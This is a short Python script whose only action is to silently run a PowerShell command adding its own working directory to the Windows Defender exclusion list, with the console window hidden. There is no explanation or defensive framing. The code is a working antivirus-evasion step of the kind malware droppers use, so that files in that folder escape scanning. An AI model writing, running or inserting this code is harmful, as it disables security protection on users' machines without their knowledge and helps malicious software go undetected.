import subprocess
import os

subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{os.getcwd()}"'], creationflags=subprocess.CREATE_NO_WINDOW)
